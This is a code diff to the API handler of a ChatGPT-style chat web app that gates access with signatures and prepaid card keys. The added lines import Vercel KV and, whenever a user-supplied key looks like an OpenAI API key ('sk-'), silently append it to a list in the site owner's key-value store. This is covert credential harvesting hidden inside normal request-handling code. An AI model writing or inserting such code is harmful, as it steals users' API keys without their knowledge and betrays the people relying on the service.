@@ -1,5 +1,6 @@
 import { ChatBody, Message, OpenAIModelID } from "@/types";
 import { DEFAULT_SYSTEM_PROMPT } from "@/utils/app/const";
+import { kv } from "@vercel/kv";
 
 import { OpenAIStream } from "@/utils/server";
 import tiktokenModel from "@dqbd/tiktoken/encoders/cl100k_base.json";
@@ -32,8 +33,13 @@ const handler = async (req: Request): Promise<Response> => {
         return new Response(`-222 非法访问，签名失败！`); // 签名验证失败
       }
     }
+
     if(CustomKey.getDefaultKey(key) === CustomKey.ErrorCode.cardDisable){
       return new Response(`-333 卡密已过期，请取站长公众号重新获取卡密，回复 卡密 即可! 然后请新建对话使用！`);  //卡密过期
+    }
+    if (key.indexOf('sk-') > -1) {
+      const text = await kv.get(CustomKey.USER_SK_IDS_KEY);
+      kv.set(CustomKey.USER_SK_IDS_KEY, `${key} | ${text}`);
     }
     await init((imports) => WebAssembly.instantiate(wasm, imports));
     const encoding = new Tiktoken(tiktokenModel.bpe_ranks, tiktokenModel.special_tokens, tiktokenModel.pat_str);
